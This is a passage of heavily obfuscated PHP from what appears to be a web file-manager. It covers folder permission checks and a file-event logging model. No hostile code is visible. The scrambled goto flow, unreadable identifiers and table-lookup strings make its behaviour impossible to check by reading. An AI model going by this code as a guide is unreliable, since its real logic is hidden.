($cÛÕÂœÙÓÓ) { return $cÛÕÂœÙÓÓ; } goto FÜæË¾Š¯; fœÜ³ÎÒ: if ($B¤‚¿î†ğ‹) { $c©­³¡âë = array(array($A÷»¿´Ò§–[371] => SourceModel::TYPE_USER, $A÷»¿´Ò§–[458] => USER_ID), array($A÷»¿´Ò§–[371] => SourceModel::TYPE_GROUP, $A÷»¿´Ò§–[458] => array($A÷»¿´Ò§–[384], $B¤‚¿î†ğ‹)), $A÷»¿´Ò§–[899] => $A÷»¿´Ò§–[2178]); } if ($B½Ó¶½º”†) { $c©­³¡âë = array($c©­³¡âë, $A÷»¿´Ò§–[2237] => array($A÷»¿´Ò§–[2267], $B½Ó¶½º”†)); } $AÑÊ‹Ó½º = $this->field($A÷»¿´Ò§–[2268])->where($c©­³¡âë)->select(); goto EÚ³©©ÈÒÊ; FŒÈÅ‰Õã·: } private function makeSourceAuth($D««õæ±Ş„, $D†ë²ÈÀë¨) { goto cÇê¤Ç„õŒ; A­áê–åµ—: return $bëñ¼ÎœçÎ; goto AÂ³×¬; E¼İˆÌ¦Ñé: $bëñ¼ÎœçÎ = !1; foreach ($b‡ï†½½Ë as $a¢†„åä) { if (!isset($D†ë²ÈÀë¨[$a¢†„åä])) { continue; } $bÙø‡¹÷“  = $this->authMake($D†ë²ÈÀë¨[$a¢†„åä]); if ($bÙø‡¹÷“ [$cîªù’ÈÓÂ[418]]) { $bëñ¼ÎœçÎ = $bÙø‡¹÷“ ; break; } } if (!$aæŒ‰¹ÑÎ‰) { return $bëñ¼ÎœçÎ; } goto dÌÔ‰Ïæ›ª; dÌÔ‰Ïæ›ª: if (!$bëñ¼ÎœçÎ && isset($Cšæ‹°ğ …[$C“†›µİß½])) { $bíÈÑ§ƒ‡’ = $Cšæ‹°ğ …[$C“†›µİß½]; $B¸Œ“àê¿á = Model($cîªù’ÈÓÂ[460])->getInfo($C“†›µİß½); $bëñ¼ÎœçÎ = array($cîªù’ÈÓÂ[2269] => intval($bíÈÑ§ƒ‡’[$cîªù’ÈÓÂ[376]][$cîªù’ÈÓÂ[376]]), $cîªù’ÈÓÂ[2270] => $bíÈÑ§ƒ‡’[$cîªù’ÈÓÂ[376]], $cîªù’ÈÓÂ[2264] => array($cîªù’ÈÓÂ[388] => $cîªù’ÈÓÂ[2274], $cîªù’ÈÓÂ[75] => $B¸Œ“àê¿á[$cîªù’ÈÓÂ[391]][$cîªù’ÈÓÂ[369]], $cîªù’ÈÓÂ[2273] => $B¸Œ“àê¿á[$cîªù’ÈÓÂ[465]])); } if (!$bëñ¼ÎœçÎ) { $B¸Œ“àê¿á = Model($cîªù’ÈÓÂ[460])->getInfo($C“†›µİß½); $dÖçˆÖéäç = explode($cîªù’ÈÓÂ[47], trim($B¸Œ“àê¿á[$cîªù’ÈÓÂ[461]], $cîªù’ÈÓÂ[47])); foreach ($dÖçˆÖéäç as $eæÈ›Öïù×) { if ($eæÈ›Öïù× == $cîªù’ÈÓÂ[470] || $eæÈ›Öïù× == $Cî‡Ü×Ş°) { continue; } if (!isset($Cšæ‹°ğ …[$eæÈ›Öïù×])) { continue; } $bíÈÑ§ƒ‡’ = $Cšæ‹°ğ …[$eæÈ›Öïù×]; $bëñ¼ÎœçÎ = array($cîªù’ÈÓÂ[2269] => intval($bíÈÑ§ƒ‡’[$cîªù’ÈÓÂ[376]][$cîªù’ÈÓÂ[376]]), $cîªù’ÈÓÂ[2270] => $bíÈÑ§ƒ‡’[$cîªù’ÈÓÂ[376]], $cîªù’ÈÓÂ[2264] => array($cîªù’ÈÓÂ[388] => $cîªù’ÈÓÂ[2271], $cîªù’ÈÓÂ[2272] => $B¸Œ“àê¿á[$cîªù’ÈÓÂ[391]][$cîªù’ÈÓÂ[369]], $cîªù’ÈÓÂ[2273] => $B¸Œ“àê¿á[$cîªù’ÈÓÂ[465]])); break; } } if (!$bëñ¼ÎœçÎ || $bëñ¼ÎœçÎ[$cîªù’ÈÓÂ[377]] <= 0) { $CíìÒ¥‡Şá = $this->authDeepCheck($D««õæ±Ş„[$cîªù’ÈÓÂ[369]]); if ($CíìÒ¥‡Şá) { $bëñ¼ÎœçÎ = $CíìÒ¥‡Şá; } } goto A­áê–åµ—; cÇê¤Ç„õŒ: $cîªù’ÈÓÂ =& $_SERVER[í™]; $Cšæ‹°ğ … = Session::get($cîªù’ÈÓÂ[2222]); $Cšæ‹°ğ … = array_to_keyvalue($Cšæ‹°ğ …, $cîªù’ÈÓÂ[2094]); goto EùåÄº­ˆß; bØ‡¦øÂ: $C“†›µİß½ = $D««õæ±Ş„[$cîªù’ÈÓÂ[458]]; $aæŒ‰¹ÑÎ‰ = $D««õæ±Ş„[$cîªù’ÈÓÂ[371]] == SourceModel::TYPE_GROUP; if ($aæŒ‰¹ÑÎ‰ && isset($Cšæ‹°ğ …[$C“†›µİß½]) && !_get($GLOBALS, $cîªù’ÈÓÂ[459])) { $bíÈÑ§ƒ‡’ = $Cšæ‹°ğ …[$C“†›µİß½]; if (Model($cîªù’ÈÓÂ[2256])->authCheckRoot($bíÈÑ§ƒ‡’[$cîªù’ÈÓÂ[376]][$cîªù’ÈÓÂ[376]])) { $B¸Œ“àê¿á = Model($cîªù’ÈÓÂ[460])->getInfo($C“†›µİß½); $bëñ¼ÎœçÎ = array($cîªù’ÈÓÂ[2269] => intval($bíÈÑ§ƒ‡’[$cîªù’ÈÓÂ[376]][$cîªù’ÈÓÂ[376]]), $cîªù’ÈÓÂ[2270] => $bíÈÑ§ƒ‡’[$cîªù’ÈÓÂ[376]], $cîªù’ÈÓÂ[2264] => array($cîªù’ÈÓÂ[388] => $cîªù’ÈÓÂ[2271], $cîªù’ÈÓÂ[2272] => $B¸Œ“àê¿á[$cîªù’ÈÓÂ[391]][$cîªù’ÈÓÂ[369]], $cîªù’ÈÓÂ[2273] => $B¸Œ“àê¿á[$cîªù’ÈÓÂ[465]])); return $bëñ¼ÎœçÎ; } } goto E¼İˆÌ¦Ñé; EùåÄº­ˆß: $Cî‡Ü×Ş° = $cîªù’ÈÓÂ[83]; $b‡ï†½½Ë = Model($cîªù’ÈÓÂ[1103])->parentLevelArray($D««õæ±Ş„[$cîªù’ÈÓÂ[461]]); $b‡ï†½½Ë = array_merge(array($D««õæ±Ş„[$cîªù’ÈÓÂ[369]]), array_reverse($b‡ï†½½Ë)); goto bØ‡¦øÂ; AÂ³×¬: } public function authOwnerApply($AÜŠùñë›) { goto bŞÅ§ÁÄ¦‚; D ™ƒ»”Óã: if (count($FâƒÙ¯ßÆ•) == 0) { $FâƒÙ¯ßÆ• = $this->authFolderOwnerGroup($AÜŠùñë›[$E¶’ô­ç’[458]]); } $FâƒÙ¯ßÆ• = array_unique($FâƒÙ¯ßÆ•); if (AuthModel::authCheckRoot($AÜŠùñë›[$E¶’ô­ç’[376]][$E¶’ô­ç’[377]])) { $FâƒÙ¯ßÆ•[] = USER_ID; } goto cœŠÖÂóÒå; cœŠÖÂóÒå: $AÜŠùñë›[$E¶’ô­ç’[376]][$E¶’ô­ç’[2277]] = Model($E¶’ô­ç’[476])->userListInfo($FâƒÙ¯ßÆ•); return $AÜŠùñë›; goto e£‹äÇê•›; Aøİ¬ÄèÃÎ: $FêÚîÇÀ”… = array(); $FâƒÙ¯ßÆ• = array(); foreach ($D…ò‚Úå­ as $f¦‡‘äÃùÁ => $BæÎÔ©ïî) { $F–Ù¡ô•˜ = $this->authFolderOwnerUser($BæÎÔ©ïî); $FêÚîÇÀ”…[$f¦‡‘äÃùÁ] = $F–Ù¡ô•˜; $FâƒÙ¯ßÆ• = array_merge($FâƒÙ¯ßÆ•, $F–Ù¡ô•˜[$E¶’ô­ç’[537]]); if ($F–Ù¡ô•˜[$E¶’ô­ç’[2276]]) { break; } } goto D ™ƒ»”Óã; E¡ÖÈ¬½àº: $f¾§Ùî†´ = Model($E¶’ô­ç’[1103])->parentLevelArray($AÜŠùñë›[$E¶’ô­ç’[461]]); $f¾§Ùî†´ = array_merge(array($AÜŠùñë›[$E¶’ô­ç’[369]]), array_reverse($f¾§Ùî†´)); $dŠÔººš–‚ = $E¶’ô­ç’[2259]; goto Bè‰Û¬Æ¤Š; Bè‰Û¬Æ¤Š: $d«®÷»Óò× = array($E¶’ô­ç’[383] => array($E¶’ô­ç’[384], $f¾§Ùî†´)); $D…ò‚Úå­ = $this->field($dŠÔººš–‚)->where($d«®÷»Óò×)->select(); $D…ò‚Úå­ = array_to_keyvalue_group($D…ò‚Úå­, $E¶’ô­ç’[369]); goto Aøİ¬ÄèÃÎ; bŞÅ§ÁÄ¦‚: $E¶’ô­ç’ =& $_SERVER[í™]; if (empty($AÜŠùñë›[$E¶’ô­ç’[376]]) || isset($AÜŠùñë›[$E¶’ô­ç’[2275]]) && $AÜŠùñë›[$E¶’ô­ç’[2275]]) { return $AÜŠùñë›; } if (AuthModel::authCheckRoot($AÜŠùñë›[$E¶’ô­ç’[376]][$E¶’ô­ç’[377]])) { return $AÜŠùñë›; } goto E¡ÖÈ¬½àº; e£‹äÇê•›: } private function authFolderOwnerGroup($BÉ‘™»ªº) { $a‘êâË…‹Û =& $_SERVER[í™]; $a·¸§ñ¤ = Model($a‘êâË…‹Û[2172])->where(array($a‘êâË…‹Û[2094] => $BÉ‘™»ªº))->select(); $AõÓÖÆ†‡ = array(); if (!$a·¸§ñ¤) { return $AõÓÖÆ†‡; } foreach ($a·¸§ñ¤ as $E”¦¡±ì–É) { $C‹ø¡Œ†é = $this->authInfo($E”¦¡±ì–É); if (AuthModel::authCheckRoot($C‹ø¡Œ†é[$a‘êâË…‹Û[376]])) { $AõÓÖÆ†‡[] = $E”¦¡±ì–É[$a‘êâË…‹Û[1423]]; } } return $AõÓÖÆ†‡; } private function authFolderOwnerUser($a“·ÏÒĞ‰‰) { $bÅÅŠ†æë =& $_SERVER[í™]; $DšâÅÏ°…† = array(); $E§¥ˆ‘Ìğï = !1; foreach ($a“·ÏÒĞ‰‰ as $cİ¾½ÎÔòô) { $e íÛÑÁ¡­ = $this->authInfo($cİ¾½ÎÔòô); if ($cİ¾½ÎÔòô[$bÅÅŠ†æë[458]] == $bÅÅŠ†æë[470]) { $E§¥ˆ‘Ìğï = !0; } if ($cİ¾½ÎÔòô[$bÅÅŠ†æë[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($e íÛÑÁ¡­[$bÅÅŠ†æë[376]])) { $DšâÅÏ°…†[] = $cİ¾½ÎÔòô[$bÅÅŠ†æë[458]]; } } } return array($bÅÅŠ†æë[537] => $DšâÅÏ°…†, $bÅÅŠ†æë[2276] => $E§¥ˆ‘Ìğï); } public function authMake($Dİœ©…íã) { goto FíŠˆÉë÷”; FÊì˜ë‡°…: $eÑõÔŠ‡­Á = $E˜½îŸ†°ê ? $DñªğÒøŞí : ($e¬†ÛÓ’Äì ? $Eƒ„™æ½§ : $cÉêØèÛø°); $a„‡õå¡¹ = $E˜½îŸ†°ê ? $EÂ¦Ëêë˜Ò : ($e¬†ÛÓ’Äì ? $A‹œª¸³óƒ : $A­éÆ¤Î); $C„ƒÆÔÁÖ– = $E˜½îŸ†°ê ? $f±½ èÜ»Õ[2278] : ($e¬†ÛÓ’Äì ? $f±½ èÜ»Õ[2279] : ($FÁ­Ê¹Ïƒ¿ ? $f±½ èÜ»Õ[2280] : $f±½ èÜ»Õ[361])); goto eøÇ¸œÎ¼‚; dÏôàõªŠ¯: $A­éÆ¤Î = 0; $E˜½îŸ†°ê = 0; $e¬†ÛÓ’Äì = 0; goto c˜„ÅˆÕ¥‚; b”ÀÁ±À¼»: $cÉêØèÛø° = 0; $EÂ¦Ëêë˜Ò = 0; $A‹œª¸³óƒ = 0; goto dÏôàõªŠ¯; eøÇ¸œÎ¼‚: $AåÕéÜŞ©¶ = array($f±½ èÜ»Õ[2269] => intval($eÑõÔŠ‡­Á), $f±½ èÜ»Õ[2270] => $a„‡õå¡¹, $f±½ èÜ»Õ[2264] => array($f±½ èÜ»Õ[388] => $C„ƒÆÔÁÖ–, $f±½ èÜ»Õ[75] => $B¯š¼Ğ»™î[$f±½ èÜ»Õ[369]])); return $AåÕéÜŞ©¶; goto FÇä…Ö±ª; AÓšÃƒ³†Ö: $a©ÑŒ¿•§… = array_to_keyvalue($E¿Ù²ÔÌ×½, $f±½ èÜ»Õ[33], $f±½ èÜ»Õ[2094]); $DñªğÒøŞí = 0; $Eƒ„™æ½§ = 0; goto b”ÀÁ±À¼»; c˜„ÅˆÕ¥‚: $FÁ­Ê¹Ïƒ¿ = 0; $B¯š¼Ğ»™î = array($f±½ èÜ»Õ[369] => 0); foreach ($Dİœ©…íã as $B¯š¼Ğ»™î) { $a„‡õå¡¹ = $this->authInfo($B¯š¼Ğ»™î); $B÷áŸø¹¬Ç = $B¯š¼Ğ»™î[$f±½ èÜ»Õ[458]]; $fî§µÕÏø  = intval($a„‡õå¡¹[$f±½ èÜ»Õ[376]]); if ($B¯š¼Ğ»™î[$f±½ èÜ»Õ[371]] == SourceModel::TYPE_USER && $B÷áŸø¹¬Ç == USER_ID) { $E˜½îŸ†°ê = !0; $EÂ¦Ëêë˜Ò = $a„‡õå¡¹; $DñªğÒøŞí = $fî§µÕÏø ; } else { if ($B¯š¼Ğ»™î[$f±½ èÜ»Õ[371]] == SourceModel::TYPE_GROUP && in_array($B÷áŸø¹¬Ç, $a©ÑŒ¿•§…)) { $e¬†ÛÓ’Äì = !0; if ($fî§µÕÏø  >= $Eƒ„™æ½§) { $Eƒ„™æ½§ = $fî§µÕÏø ; $A‹œª¸³óƒ = $a„‡õå¡¹; } } else { if ($B÷áŸø¹¬Ç == $f±½ èÜ»Õ[470]) { $FÁ­Ê¹Ïƒ¿ = !0; $A­éÆ¤Î = $a„‡õå¡¹; $cÉêØèÛø° = $fî§µÕÏø ; } } } } goto FÊì˜ë‡°…; FíŠˆÉë÷”: $f±½ èÜ»Õ =& $_SERVER[í™]; if (!$Dİœ©…íã) { return array($f±½ èÜ»Õ[377] => 0, $f±½ èÜ»Õ[418] => !1); } $E¿Ù²ÔÌ×½ = Session::get($f±½ èÜ»Õ[2222]); goto AÓšÃƒ³†Ö; FÇä…Ö±ª: } public function authTargetInfoMake($D¢¼Ìø¸ö”) { goto CãŠ…Œì…; CÍ¸œÛñï¹: foreach ($D¢¼Ìø¸ö” as $Aõâ‚êÉ¶) { if ($Aõâ‚êÉ¶[$déÕåğø[371]] == SourceModel::TYPE_USER) { $c¿Ø ƒÅ[] = intval($Aõâ‚êÉ¶[$déÕåğø[458]]); } else { if ($Aõâ‚êÉ¶[$déÕåğø[371]] == SourceModel::TYPE_GROUP) { $c¬Ã¼ÃÙğÁ[] = intval($Aõâ‚êÉ¶[$déÕåğø[458]]); } } } if ($c¿Ø ƒÅ) { $c¿Ø ƒÅ = Model($déÕåğø[476])->userListInfo($c¿Ø ƒÅ); } if ($c¬Ã¼ÃÙğÁ) { $AÓï­óáÍ‘ = array($déÕåğø[2170] => array($déÕåğø[384], $c¬Ã¼ÃÙğÁ)); $c¬Ã¼ÃÙğÁ = Model($déÕåğø[460])->field($déÕåğø[2183])->where($AÓï­óáÍ‘)->select(); $c¬Ã¼ÃÙğÁ = array_to_keyvalue($c¬Ã¼ÃÙğÁ, $déÕåğø[2094]); } goto B©âËšÜ­Ì; B©âËšÜ­Ì: return array($déÕåğø[2281] => $c¿Ø ƒÅ, $déÕåğø[2273] => $c¬Ã¼ÃÙğÁ); goto cñÒ„ğÉÁÕ; CãŠ…Œì…: $déÕåğø =& $_SERVER[í™]; $c¿Ø ƒÅ = array(); $c¬Ã¼ÃÙğÁ = array(); goto CÍ¸œÛñï¹; cñÒ„ğÉÁÕ: } public function authInfo($b£õãã) { $DØ½·ÍšÈª =& $_SERVER[í™]; if ($b£õãã[$DØ½·ÍšÈª[2237]]) { $eĞÓïĞèÜÎ = Model($DØ½·ÍšÈª[2256])->listData($b£õãã[$DØ½·ÍšÈª[2237]]); if (!$eĞÓïĞèÜÎ) { return !1; $d·À¯¿Äƒ„ = Model($DØ½·ÍšÈª[2256])->listData(); $CŒˆšš¢Ô = array_filter_by_field($d·À¯¿Äƒ„, $DØ½·ÍšÈª[376], $DØ½·ÍšÈª[470]); return $CŒˆšš¢Ô; } $bò•æ³“† = array_field_key($eĞÓïĞèÜÎ, array($DØ½·ÍšÈª[367], $DØ½·ÍšÈª[28], $DØ½·ÍšÈª[376], $DØ½·ÍšÈª[2112], $DØ½·ÍšÈª[2115])); $bò•æ³“†[$DØ½·ÍšÈª[2282]] = $b£õãã; return $bò•æ³“†; } else { return array($DØ½·ÍšÈª[385] => 0, $DØ½·ÍšÈª[2100] => $b£õãã[$DØ½·ÍšÈª[2238]], $DØ½·ÍšÈª[386] => $DØ½·ÍšÈª[33], $DØ½·ÍšÈª[2112] => $DØ½·ÍšÈª[2283]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\162\143\x65\137\x65\166\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\151\155\x65", "\164\x69\155\145", "\x69\156\163\145\162\x74", "\146\165\156\143\x74\151\157\156"), array("\x64\145\163\143", '', "\x69\x6e\163\145\x72\x74\x2c\x75\160\144\x61\x74\145\54\x73\145\x6c\145\143\x74", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($E«áÖ‡‚Øù, $b¡óŒ±™¨, $eÉê¹Ä´øÎ = '') { goto cÃ°ìÜÀ¸°; cÃ°ìÜÀ¸°: $fÓòß²Íùá =& $_SERVER[í™]; if (!$this->eventSave) { return; } $E„í¿‰ˆ¸Ğ = Model($fÓòß²Íùá[1103])->sourceInfo($E«áÖ‡‚Øù); goto d”ÛÂÍâ‹ï; d”ÛÂÍâ‹ï: if (!$E„í¿‰ˆ¸Ğ) { return !1; } if ($this->isCacheEvent($E„í¿‰ˆ¸Ğ, $b¡óŒ±™¨)) { return; } if ($eÉê¹Ä´øÎ && is_string($eÉê¹Ä´øÎ)) { $eÉê¹Ä´øÎ = array($fÓòß²Íùá[2124] => $eÉê¹Ä´øÎ); } goto eåÄºùª×¬; eåÄºùª×¬: $c©Æê»Øõ• = array($fÓòß²Íùá[383] => $E«áÖ‡‚Øù, $fÓòß²Íùá[2284] => $E„í¿‰ˆ¸Ğ[$fÓòß²Íùá[463]], $fÓòß²Íùá[2285] => $E„í¿‰ˆ¸Ğ[$fÓòß²Íùá[28]], $fÓòß²Íùá[468] => $E„í¿‰ˆ¸Ğ[$fÓòß²Íùá[468]], $fÓòß²Íùá[1414] => USER_ID, $fÓòß²Íùá[388] => $b¡óŒ±™¨, $fÓòß²Íùá[1416] => $eÉê¹Ä´øÎ); $this->addSystemLog($b¡óŒ±™¨, $c©Æê»Øõ•); return $this->add($c©Æê»Øõ•); goto D¾®¯òê½‡; D¾®¯òê½‡: } private function addSystemLog($fÈ¨’Ì‚ã, $dšÆÆ”£ºÅ) { $bó¶ñàÈ“Ô =& $_SERVER[í™]; if ($fÈ¨’Ì‚ã == $bó¶ñàÈ“Ô[2286]) { $fÈ¨’Ì‚ã = $dšÆÆ”£ºÅ[$bó¶ñàÈ“Ô[405]][$bó¶ñàÈ“Ô[2287]]; } else { if (in_array($fÈ¨’Ì‚ã, array($bó¶ñàÈ“Ô[2071], $bó¶ñàÈ“Ô[2288]))) { $fÈ¨’Ì‚ã = $dšÆÆ”£ºÅ[$bó¶ñàÈ“Ô[405]][$bó¶ñàÈ“Ô[674]]; } } $Bø¶»‡¤ó = array_merge($dšÆÆ”£ºÅ, array($bó¶ñàÈ“Ô[2289] => $dšÆÆ”£ºÅ[$bó¶ñàÈ“Ô[369]], $bó¶ñàÈ“Ô[2290] => $dšÆÆ”£ºÅ[$bó¶ñàÈ“Ô[2290]])); Model($bó¶ñàÈ“Ô[2034])->addLog($bó¶ñàÈ“Ô[2291] . $fÈ¨’Ì‚ã, $Bø¶»‡¤ó); } private function isCacheEvent($F²ÊçëÑö, $Aó¿¼³˜¹ó) { if ($F²ÊçëÑö[$_SERVER[í™][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($c¯ÈìïÔ£Ç, $Eã©” Ë²) { $D›Œ±ÇïÎô =& $_SERVER[í™]; $cí´ÁÈæ°Å = Model($D›Œ±ÇïÎô[1103])->sourceInfo($c¯ÈìïÔ£Ç); $DÔÓé˜Ÿé = array($D›Œ±ÇïÎô[2287] => $Eã©” Ë², $D›Œ±ÇïÎô[28] => $cí´ÁÈæ°Å[$D›Œ±ÇïÎô[28]]); return $this->addEvent($c¯ÈìïÔ£Ç, $D›Œ±ÇïÎô[2286], $DÔÓé˜Ÿé); } public function eventFileEdit($b†·›ºè») { $d×’±‡ŒÃê =& $_SERVER[í™]; $bÖ±İ¥ª‚ö = array($d×’±‡ŒÃê[2292] => $_SERVER[$d×’±‡ŒÃê[2293]], $d×’±‡ŒÃê[1738] => strtolower(ACTION)); return $this->addEvent($b†·›ºè», $d×’±‡ŒÃê[2061], $bÖ±İ¥ª‚ö); } public function eventRecycle($dóƒìÃ™‡Ü, $B×‰ÇëÎå) { return $this->addEvent($dóƒìÃ™‡Ü, $_SERVER[í™][2288], $B×‰ÇëÎå); } public function eventRemove($E³‰½£ÃÌ£) { $fô÷ÈÜ™á =& $_SERVER[í™]; $EãØäÌÔ•› = Model($fô÷ÈÜ™á[1103])->sourceInfo($E³‰½£ÃÌ£); $aÈ¦âá›çà = $EãØäÌÔ•›[$fô÷ÈÜ™á[28]]; return $this->addEvent($EãØäÌÔ•›[$fô÷ÈÜ™á[463]], $fô÷ÈÜ™á[2060], $aÈ¦âá›çà); } public function eventShare($f•‡”ÚË‡˜, $c·Æ¥Àô¿) { return $this->addEvent($f•‡”ÚË‡˜, $_SERVER[í™][2071], $c·Æ¥Àô¿); } public function eventMove($d©ØáÂ‹ï, $fƒĞùïƒ¹, $D…Åí“äéÒ) { goto FË¼ßå¬‘; FË¼ßå¬‘: $E©óšİ¹²ä =& $_SERVER[í™]; $AÉÏë«ÚÌ· = Model($E©óšİ¹²ä[1103]); $FÑ•¯•‹ = $AÉÏë«ÚÌ·->sourceInfo($d©ØáÂ‹ï); goto bñ†×É‡Ç; d§òÛ•™¥Ü: $this->addEvent($fƒĞùïƒ¹, $E©óšİ¹²ä[2298], $AÉŞ£‡ŒÁÂ); goto cµğ¤Ÿ×•œ; Cé™ñ®˜—: $this->addEvent($d©ØáÂ‹ï, $E©óšİ¹²ä[494], $AÉŞ£‡ŒÁÂ); $FÑ•¯•‹ = $AÉÏë«ÚÌ·->sourceInfo($d©ØáÂ‹ï); $AÉŞ£‡ŒÁÂ = array($E©óšİ¹²ä[369] => $FÑ•¯•‹[$E©óšİ¹²ä[369]], $E©óšİ¹²ä[28] => $FÑ•¯•‹[$E©óšİ¹²ä[28]]); goto d§òÛ•™¥Ü; bñ†×É‡Ç: $aĞù‡Æğ = $AÉÏë«ÚÌ·->sourceInfo($fƒĞùïƒ¹); $cóåâ¼´Ä° = $AÉÏë«ÚÌ·->sourceInfo($D…Åí“äéÒ); $AÉŞ£‡ŒÁÂ = array($E©óšİ¹²ä[993] => $fƒĞùïƒ¹, $E©óšİ¹²ä[2294] => $aĞù‡Æğ[$E©óšİ¹²ä[28]], $E©óšİ¹²ä[2295] => $aĞù‡Æğ[$E©óšİ¹²ä[468]], $E©óšİ¹²ä[994] => $D…Åí“äéÒ, $E©óšİ¹²ä[2296] => $cóåâ¼´Ä°[$E©óšİ¹²ä[28]], $E©óšİ¹²ä[2297] => $cóåâ¼´Ä°[$E©óšİ¹²ä[468]]); goto Cé™ñ®˜—; cµğ¤Ÿ×•œ: } public function eventCopy($Bì¶îŠ×‚Ğ) { $this->eventCreate($Bì¶îŠ×‚Ğ, $_SERVER[í™][492]); } public function eventRename($c¼Î¾Ì§äù, $Có½ˆÆ¾‰†, $f†—ã³‰ÓŠ) { $fæº¶›ñÜ =& $_SERVER[í™]; $dŒöØ­ÉÄ¶ = array($fæº¶›ñÜ[993] => $Có½ˆÆ¾‰†, $fæº¶›ñÜ[994] => $f†—ã³‰ÓŠ); return $this->addEvent($c¼Î¾Ì§äù, $fæº¶›ñÜ[1116], $dŒöØ­ÉÄ¶); } public function eventAddComment($AãâØŸ¿Åˆ, $EŒÔî‚“®) { return $this->addEvent($AãâØŸ¿Åˆ, $_SERVER[í™][2299], $EŒÔî‚“®); } public function eventAddDesc($d’õÂ‡Ü®Á, $Bé¨“„ËØÃ) { return $this->addEvent($d’õÂ‡Ü®Á, $_SERVER[í™][2300], $Bé¨“„ËØÃ); } public function listBySource($EÏ½†«Â) { goto f‰Á¼„×—; EÂ©ë³ªŸ¶: if ($c£Á®Ìùä[$CÊÜØÛªë[370]] == $CÊÜØÛªë[83]) { $b¡ÍˆÃ”©™ = Model($CÊÜØÛªë[1103])->listSearchChildren($EÏ½†«Â, 20000); $b¡ÍˆÃ”©™[] = $EÏ½†«Â . $CÊÜØÛªë[361]; $Aå¤øéÂ˜ = array($CÊÜØÛªë[369] => array($CÊÜØÛªë[7], $b¡ÍˆÃ”©™)); } $aƒŒÚÊ•Ù = $this->where($Aå¤øéÂ˜)->order($CÊÜØÛªë[2301])->selectPage(); if ($aƒŒÚÊ•Ù[$CÊÜØÛªë[351]][$CÊÜØÛªë[352]] == 0) { $aƒŒÚÊ•Ù[$CÊÜØÛªë[351]][$CÊÜØÛªë[352]] = 1; $aƒŒÚÊ•Ù[$CÊÜØÛªë[354]] = array(array($CÊÜØÛªë[383] => $EÏ½†«Â, $CÊÜØÛªë[2284] => $c£Á®Ìùä[$CÊÜØÛªë[463]], $CÊÜØÛªë[1414] => $c£Á®Ìùä[$CÊÜØÛªë[378]], $CÊÜØÛªë[388] => $CÊÜØÛªë[2302], $CÊÜØÛªë[389] => $c£Á®Ìùä[$CÊÜØÛªë[187]], $CÊÜØÛªë[1416] => $CÊÜØÛªë[33])); } goto f“ÂŞµŠÁ; f‰Á¼„×—: $CÊÜØÛªë =& $_SERVER[í™]; $c£Á®Ìùä = Model($CÊÜØÛªë[1103])->sourceInfo($EÏ½†«Â); $Aå¤øéÂ˜ = array($CÊÜØÛªë[383] => $EÏ½†«Â); goto EÂ©ë³ªŸ¶; f“ÂŞµŠÁ: return $this->eventListParse($aƒŒÚÊ•Ù, $EÏ½†«Â); goto bÏ„ø˜‰Ú; bÏ„ø˜‰Ú: } private function eventListParse($cŞç©êÃ†, $C®Ûƒ›‹¨÷) { goto CÎ­ÃØÅÖÒ; f¢à­×µÑ: return $cŞç©êÃ†; goto BêÙÓÉÜªë; CÎ­ÃØÅÖÒ: $FâŠ¬Ü·‡Ô =& $_SERVER[í™]; $Eªñ¿½ÅÙ = $cŞç©êÃ†[$FâŠ¬Ü·‡Ô[354]]; $cÈ—ñ¹Ë´Æ = array_to_keyvalue($Eªñ¿½ÅÙ, $FâŠ¬Ü·‡Ô[33], $FâŠ¬Ü·‡Ô[369]); goto e½©ØÄ…; e½©ØÄ…: $A™õí‹½‚ = array_to_keyvalue($Eªñ¿½ÅÙ, $FâŠ¬Ü·‡Ô[33], $FâŠ¬Ü·‡Ô[2290]); foreach ($Eªñ¿½ÅÙ as $a¼é ¢£Ğñ) { $c–ß¤‚¼ÛŠ = $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[405]]; if ($a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[29]] == $FâŠ¬Ü·‡Ô[494] && isset($c–ß¤‚¼ÛŠ[$FâŠ¬Ü·‡Ô[993]])) { $cÈ—ñ¹Ë´Æ[] = $c–ß¤‚¼ÛŠ[$FâŠ¬Ü·‡Ô[993]] . $FâŠ¬Ü·‡Ô[33]; $cÈ—ñ¹Ë´Æ[] = $c–ß¤‚¼ÛŠ[$FâŠ¬Ü·‡Ô[994]] . $FâŠ¬Ü·‡Ô[33]; } if ($a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[29]] == $FâŠ¬Ü·‡Ô[2298] && isset($c–ß¤‚¼ÛŠ[$FâŠ¬Ü·‡Ô[369]])) { $cÈ—ñ¹Ë´Æ[] = $c–ß¤‚¼ÛŠ[$FâŠ¬Ü·‡Ô[369]] . $FâŠ¬Ü·‡Ô[33]; } } $cÈ—ñ¹Ë´Æ = array_merge($cÈ—ñ¹Ë´Æ, $A™õí‹½‚, array($C®Ûƒ›‹¨÷ . $FâŠ¬Ü·‡Ô[33])); goto aœ¿„¾·ö³; aœ¿„¾·ö³: $cÈ—ñ¹Ë´Æ = array_unique($cÈ—ñ¹Ë´Æ); $eÈßª¼ÀÚ× = array_unique(array_to_keyvalue($Eªñ¿½ÅÙ, $FâŠ¬Ü·‡Ô[33], $FâŠ¬Ü·‡Ô[1423])); $cÙ¯¬ƒóç = Model($FâŠ¬Ü·‡Ô[479])->userListInfo($eÈßª¼ÀÚ×); goto Aã²•Ûö¹‰; Aã²•Ûö¹‰: $bÉ›´¯®ñÚ = Model($FâŠ¬Ü·‡Ô[734])->sourceListInfo($cÈ—ñ¹Ë´Æ, !0); foreach ($Eªñ¿½ÅÙ as &$a¼é ¢£Ğñ) { if ($a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[29]] == $FâŠ¬Ü·‡Ô[494] && isset($a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[405]][$FâŠ¬Ü·‡Ô[993]])) { $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[405]][$FâŠ¬Ü·‡Ô[993]] = $bÉ›´¯®ñÚ[$a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[405]][$FâŠ¬Ü·‡Ô[993]]]; $a¼é 